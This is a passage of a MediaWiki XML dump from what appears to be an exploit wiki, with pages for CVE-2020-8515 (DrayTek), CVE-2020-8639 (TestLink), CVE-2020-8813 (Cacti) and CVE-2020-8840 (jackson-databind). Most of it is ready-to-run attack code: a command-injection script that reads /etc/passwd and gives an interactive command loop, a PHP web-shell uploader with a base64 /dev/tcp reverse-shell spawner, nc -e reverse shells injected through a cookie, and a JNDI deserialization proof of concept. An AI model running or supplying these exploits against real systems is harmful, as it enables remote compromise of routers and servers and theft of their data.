        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    Cmd = Cmd.replace(' ','${IFS}')
    data = "action=login&amp;keyPath=%27%0A%2fbin%2f%26{}%0A%27&amp;loginUser=a&amp;loginPwd=a".format(Cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200:
            print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;</text>
      <sha1>5ujvmw5li9nzjnr4f6e83epc8dbkbvo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8515 DrayTek企業網絡設備 遠程命令執行漏洞/uk</title>
    <ns>0</ns>
    <id>318</id>
    <revision>
      <id>476</id>
      <timestamp>2021-03-19T11:27:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-8515 Уразливість програми дистанційного керування мережевим пристроєм DrayTek Enterprise"</comment>
      <origin>476</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3592" sha1="k14j6b53qavlyung4nrlll0bskr1mfl" xml:space="preserve">&lt;languages  /&gt;
== Вплив вразливості ==
&lt;pre&gt;
Vigor2960 &lt; v1.5.1

Vigor300B &lt; v1.5.1

Vigor3900 &lt; v1.5.1

VigorSwitch20P2121 &lt;= v2.3.2

VigorSwitch20G1280 &lt;= v2.3.2

VigorSwitch20P1280 &lt;= v2.3.2

VigorSwitch20G2280 &lt;= v2.3.2

VigorSwitch20P2280 &lt;= v2.3.2
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Vigor 2960"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: DrayTek企业网络设备                                        \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         &gt;&gt;&gt; pwd                                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = "action=login&amp;keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&amp;loginUser=a&amp;loginPwd=a"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, Cmd)
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)
        sys.exit(0)

def POC_2(target_url, Cmd):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    Cmd = Cmd.replace(' ','${IFS}')
    data = "action=login&amp;keyPath=%27%0A%2fbin%2f%26{}%0A%27&amp;loginUser=a&amp;loginPwd=a".format(Cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200:
            print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;</text>
      <sha1>k14j6b53qavlyung4nrlll0bskr1mfl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8639 TestLink 1.9.20 任意文件上傳漏洞</title>
    <ns>0</ns>
    <id>987</id>
    <revision>
      <id>1261</id>
      <timestamp>2021-04-08T09:24:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: TestLink 1.9.20 - Unrestricted File Upload (Authenticated) # Date: 14th February 2021 # Exploit Author: snovvcrash # Original Research by: Ackce..."</comment>
      <origin>1261</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7129" sha1="62bfl0ecyeiu0tr8l0y4grq20z109b3" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: TestLink 1.9.20 - Unrestricted File Upload (Authenticated)
# Date: 14th February 2021
# Exploit Author: snovvcrash
# Original Research by: Ackcent AppSec Team
# Original Research: https://ackcent.com/testlink-1-9-20-unrestricted-file-upload-and-sql-injection/
# Vendor Homepage: https://testlink.org/
# Software Link: https://github.com/TestLinkOpenSourceTRMS/testlink-code
# Version: 1.9.20
# Tested on: Ubuntu 20.10
# CVE: CVE-2020-8639
# Requirements: pip3 install -U requests bs4
# Usage Example: ./exploit.py -u admin -p admin -P 127.0.0.1:8080 http://127.0.0.1/testlink

"""
Raw exploit request:

POST /testlink/lib/keywords/keywordsImport.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------242818621515179709592867995067
Content-Length: 1187
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/testlink//lib/keywords/keywordsImport.php?tproject_id=1
Cookie: PHPSESSID=kvbpl3t3lec42qbjdcgdppncib; TESTLINK1920TESTLINK_USER_AUTH_COOKIE=af57ebce9f54ce0f0e36d24ef25dc9c1b3a9d2f8e0b9cb4454c973927306e90f
Upgrade-Insecure-Requests: 1

-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="CSRFName"

CSRFGuard_1115715115
-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="CSRFToken"

506c4b44825c5e5885231c263e7195188dedbd154b9cf74e5d183c1feb953aec7c0edae1097649d82acd20f6f851e0cdbac91cc0589d1cfd6fb13741f9cf0cb8
-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="importType"

/../../../logs/pwn.php
-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="MAX_FILE_SIZE"

409600
-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="uploadedFile"; filename="foo.xml"
Content-Type: application/xml

&lt;?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2&gt;&amp;1' );} ?&gt;
-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="tproject_id"

1
-----------------------------242818621515179709592867995067
Content-Disposition: form-data; name="UploadFile"

Upload file
-----------------------------242818621515179709592867995067--
"""

#!/usr/bin/env python3

import re
from urllib import parse
from cmd import Cmd
from base64 import b64encode
from argparse import ArgumentParser

import requests
from bs4 import BeautifulSoup

parser = ArgumentParser()
parser.add_argument('target', help='target full URL without trailing slash, ex. "http://127.0.0.1/testlink"')
parser.add_argument('-u', '--username', default='admin', help='TestLink username')
parser.add_argument('-p', '--password', default='admin', help='TestLink password')
parser.add_argument('-P', '--proxy', default=None, help='HTTP proxy in format &lt;HOST:PORT&gt;, ex. "127.0.0.1:8080"')
args = parser.parse_args()


class TestLinkWebShell(Cmd):

	payloadPHP = """&lt;?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2&gt;&amp;1' );} ?&gt;"""
	uploadPath = 'logs/pwn.php'
	prompt = '$ '

	def __init__(self, target, username, password, proxies):
		super().__init__()

		self.target = target
		self.username = username
		self.password = password

		if proxies:
			self.proxies = {'http': f'http://{proxies}', 'https': f'http://{proxies}'}
		else:
			self.proxies = None

		self.session = requests.Session()
		self.session.verify = False

		resp = self.session.get(f'{self.target}/login.php', proxies=self.proxies)
		soup = BeautifulSoup(resp.text, 'html.parser')

		self.csrf_name = soup.find('input', {'name': 'CSRFName'}).get('value')
		self.csrf_token = soup.find('input', {'name': 'CSRFToken'}).get('value')
		self.req_uri = soup.find('input', {'name': 'reqURI'}).get('value')
		self.destination = soup.find('input', {'name': 'destination'}).get('value')

	def auth(self):
		data = {
			'CSRFName': self.csrf_name,
			'CSRFToken': self.csrf_token,
			'reqURI': self.req_uri,
			'destination': self.destination,
			'tl_login': self.username,
			'tl_password': self.password
		}

		resp = self.session.post(f'{self.target}/login.php?viewer=', data=data, proxies=self.proxies)
		if resp.status_code == 200:
			print('[*] Authentication succeeded')

			resp = self.session.get(f'{self.target}/lib/general/mainPage.php', proxies=self.proxies)
			if resp.status_code == 200:
				print('[*] Loaded mainPage.php iframe contents')
				soup = BeautifulSoup(resp.text, 'html.parser')

				self.tproject_id = soup.find('a', {'href': re.compile(r'lib/keywords/keywordsView.php\?')}).get('href')
				self.tproject_id = parse.parse_qs(parse.urlsplit(self.tproject_id).query)['tproject_id'][0]

				print(f'[+] Extracted tproject_id value: {self.tproject_id}')

			else:
				raise Exception('Error loading mainPage.php iframe contents')

		else:
			raise Exception('Authentication failed')

	def upload_web_shell(self):
		files = [
			('CSRFName', (None, self.csrf_name)),
			('CSRFToken', (None, self.csrf_token)),
			('importType', (None, f'/../../../{TestLinkWebShell.uploadPath}')),
			('MAX_FILE_SIZE', (None, '409600')),
			('uploadedFile', ('foo.xml', TestLinkWebShell.payloadPHP)),
			('tproject_id', (None, self.tproject_id)),
			('UploadFile', (None, 'Upload file'))
		]

		resp = self.session.post(f'{self.target}/lib/keywords/keywordsImport.php', files=files, proxies=self.proxies)
		if resp.status_code == 200:
			print(f'[*] Web shell uploaded here: {self.target}/{TestLinkWebShell.uploadPath}')

			print('[*] Trying to query whoami...')
			resp = self.session.get(f'{self.target}/{TestLinkWebShell.uploadPath}?c=whoami', proxies=self.proxies)
			if resp.status_code == 200:
				print(f'[+] Success! Starting semi-interactive shell as {resp.text.strip()}')

			else:
				raise Exception('Error interacting with the web shell')

		else:
			raise Exception('Error uploading web shell')

	def emptyline(self):
		pass

	def preloop(self):
		self.auth()
		self.upload_web_shell()

	def default(self, args):
		try:
			resp = self.session.get(f'{self.target}/{TestLinkWebShell.uploadPath}?c={args}', proxies=self.proxies)
			if resp.status_code == 200:
				print(resp.text.strip())
		except Exception as e:
			print(f'*** Something weired happened: {e}')

	def do_spawn(self, args):
		"""Spawn a reverse shell. Usage: \"spawn &lt;LHOST&gt; &lt;LPORT&gt;\"."""
		try:
			lhost, lport = args.split()
			payload = f'/bin/bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1'
			b64_payload = b64encode(payload.encode()).decode()
			cmd = f'echo {b64_payload} | base64 -d | /bin/bash'
			self.default(cmd)
		except Exception as e:
			print(f'*** Something weired happened: {e}')

	def do_EOF(self, args):
		"""Use Ctrl-D to exit the shell."""
		print(); return True


if __name__ == '__main__':
	tlws = TestLinkWebShell(args.target, args.username, args.password, args.proxy)
	tlws.cmdloop('Type help for list of commands')
&lt;/pre&gt;</text>
      <sha1>62bfl0ecyeiu0tr8l0y4grq20z109b3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8813 Cacti v1.2.8 RCE漏洞</title>
    <ns>0</ns>
    <id>1339</id>
    <revision>
      <id>1679</id>
      <timestamp>2021-04-15T05:55:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP1== 需要認證 &lt;pre&gt; #!/usr/bin/python3  # Exploit Title: Cacti v1.2.8 Remote Code Execution # Date: 03/02/2020 # Exploit Author: Askar (@mohammadaskar2) # CVE: CVE-202..."</comment>
      <origin>1679</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4038" sha1="6j8ggrpwzxwuwk371das7fwc2bknkr4" xml:space="preserve">==EXP1==
需要認證
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Cacti v1.2.8 Remote Code Execution
# Date: 03/02/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3 / PHP 7.1.33

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
    print("[~] Usage : ./Cacti-exploit.py url username password ip port")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

def login(token):
    login_info = {
    "login_username": username,
    "login_password": password,
    "action": "login",
    "__csrf_magic": token
    }
    login_request = request.post(url+"/index.php", login_info)
    login_text = login_request.text
    if "Invalid User Name/Password Please Retype" in login_text:
        return False
    else:
        return True

def enable_guest(token):
    request_info = {
    "id": "3",
    "section25": "on",
    "section7": "on",
    "tab": "realms",
    "save_component_realm_perms": 1,
    "action": "save",
    "__csrf_magic": token
    }
    enable_request = request.post(url+"/user_admin.php?header=false", request_info)
    if enable_request:
        return True
    else:
        return False

def send_exploit():
    payload = ";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % (ip, port)
    cookies = {'Cacti': quote(payload)}
    requests.get(url+"/graph_realtime.php?action=init", cookies=cookies)

request = requests.session()
print("[+]Retrieving login CSRF token")
page = request.get(url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content, "html5lib")
token = soup.findAll('input')[0].get("value")
if token:
    print("[+]Token Found : %s" % token)
    print("[+]Sending creds ..")
    login_status = login(token)
    if login_status:
        print("[+]Successfully LoggedIn")
        print("[+]Retrieving CSRF token ..")
        page = request.get(url+"/user_admin.php?action=user_edit&amp;id=3&amp;tab=realms")
        html_content = page.text
        soup = BeautifulSoup(html_content, "html5lib")
        token = soup.findAll('input')[1].get("value")
        if token:
            print("[+]Making some noise ..")
            guest_realtime = enable_guest(token)
            if guest_realtime:
                print("[+]Sending malicous request, check your nc ;)")
                send_exploit()
            else:
                print("[-]Error while activating the malicous account")

        else:
            print("[-] Unable to retrieve CSRF token from admin page!")
            exit()

    else:
        print("[-]Cannot Login!")
else:
    print("[-] Unable to retrieve CSRF token!")
    exit()
&lt;/pre&gt;


==EXP2==
開啟來賓實時圖查看權限則不需要認證
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution
# Date: 03/02/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3 / PHP 7.1.33

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 4:
    print("[~] Usage : ./Cacti-exploit.py url ip port")
    exit()

url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

def send_exploit(url):
    payload = ";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % (ip, port)
    cookies = {'Cacti': quote(payload)}
    path = url+"/graph_realtime.php?action=init"
    req = requests.get(path)
    if req.status_code == 200 and "poller_realtime.php" in req.text:
        print("[+] File Found and Guest is enabled!")
        print("[+] Sending malicous request, check your nc ;)")
        requests.get(path, cookies=cookies)
    else:
        print("[+] Error while requesting the file!")

send_exploit(url)
&lt;/pre&gt;</text>
      <sha1>6j8ggrpwzxwuwk371das7fwc2bknkr4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8840 FasterXML jackson-databind 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4535</id>
    <revision>
      <id>5219</id>
      <timestamp>2021-06-17T00:58:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;translate&gt; jackson-databind 2.0.0 – 2.9.10.2  經驗證fastjson在開啟了autoType功能的情況下，影響最新..."</comment>
      <origin>5219</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="741" sha1="lhrkh88vyj1kbjvc7zaz983ny75umf0" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;translate&gt;
jackson-databind 2.0.0 – 2.9.10.2

經驗證fastjson在開啟了autoType功能的情況下，影響最新的fastjson v1.2.62版本
&lt;/translate&gt;

==POC==
&lt;pre&gt;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
   public static void main(String args[]) {
       ObjectMapper mapper = new ObjectMapper();

       mapper.enableDefaultTyping();

       String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";

       try {
           mapper.readValue(json, Object.class);
       } catch (IOException e) {
           e.printStackTrace();
       }

   }
}
&lt;/pre&gt;</text>
      <sha1>lhrkh88vyj1kbjvc7zaz983ny75umf0</sha1>
    </revision>
    <revision>
      <id>5220</id>
      <parentid>5219</parentid>
      <timestamp>2021-06-17T01:00:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5220</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="774" sha1="kcp004kl39fklvw7454xkmnqwct5et3" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
jackson-databind 2.0.0 – 2.9.10.2

&lt;!--T:3--&gt;
經驗證fastjson在開啟了autoType功能的情況下，影響最新的fastjson v1.2.62版本
&lt;/translate&gt;

==POC==
&lt;pre&gt;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
   public static void main(String args[]) {
       ObjectMapper mapper = new ObjectMapper();

       mapper.enableDefaultTyping();

       String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";

       try {
           mapper.readValue(json, Object.class);
       } catch (IOException e) {
           e.printStackTrace();
       }

   }
}
&lt;/pre&gt;</text>
      <sha1>kcp004kl39fklvw7454xkmnqwct5et3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8840 FasterXML jackson-databind 遠程代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>4561</id>
    <revision>
      <id>5248</id>
      <timestamp>2021-06-17T01:13:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-8840 FasterXML vulnerabilidad de ejecución remota de código jackson-databind"</comment>
      <origin>5248</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="735" sha1="hfxj27bw08mlr5to851id0fwuv4ao24" xml:space="preserve">&lt;languages /&gt;
== Impacto de la vulnerabilidad ==
jackson-databind 2.0.0 – 2.9.10.2

Se ha verificado que fastjson afecta a la última versión de fastjson v1.2.62 cuando la función autoType está activada

==POC==
&lt;pre&gt;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
   public static void main(String args[]) {
       ObjectMapper mapper = new ObjectMapper();

       mapper.enableDefaultTyping();

       String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";

       try {
           mapper.readValue(json, Object.class);
       } catch (IOException e) {
           e.printStackTrace();
       }

   }
}
&lt;/pre&gt;</text>
      <sha1>hfxj27bw08mlr5to851id0fwuv4ao24</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8840 FasterXML jackson-databind 遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4541</id>
    <revision>
      <id>5226</id>
      <timestamp>2021-06-17T01:01:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-8840 FasterXML jackson-databind 远程代码执行漏洞"</comment>
      <origin>5226</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="874" sha1="f7y53ja40pjz7f0g3an143oih0idxv0" xml:space="preserve">&lt;languages /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
jackson-databind 2.0.0 – 2.9.10.2
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
經驗證fastjson在開啟了autoType功能的情況下，影響最新的fastjson v1.2.62版本
&lt;/div&gt;

==POC==
&lt;pre&gt;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
   public static void main(String args[]) {
       ObjectMapper mapper = new ObjectMapper();

       mapper.enableDefaultTyping();

       String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";

       try {
           mapper.readValue(json, Object.class);
       } catch (IOException e) {
           e.printStackTrace();
       }

   }
}
&lt;/pre&gt;</text>
      <sha1>f7y53ja40pjz7f0g3an143oih0idxv0</sha1>
    </revision>
    <revision>
      <id>5230</id>
      <parentid>5226</parentid>
      <timestamp>2021-06-17T01:02:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "jackson-databind 2.0.0 – 2.9.10.2"</comment>
      <origin>5230</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="691" sha1="aj8l5jar6wt0wj7cau9ysudsf1cuohs" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
jackson-databind 2.0.0 – 2.9.10.2

经验证fastjson在开启了autoType功能的情况下，影响最新的fastjson v1.2.62版本

==POC==
&lt;pre&gt;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;

public class Poc {
   public static void main(String args[]) {
       ObjectMapper mapper = new ObjectMapper();

       mapper.enableDefaultTyping();

       String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";

       try {
           mapper.readValue(json, Object.class);
       } catch (IOException e) {
           e.printStackTrace();
       }

   }
}
&lt;/pre&gt;</text>
      <sha1>aj8l5jar6wt0wj7cau9ysudsf1cuohs</sha1>
    </revision>
  </page>
</mediawiki>
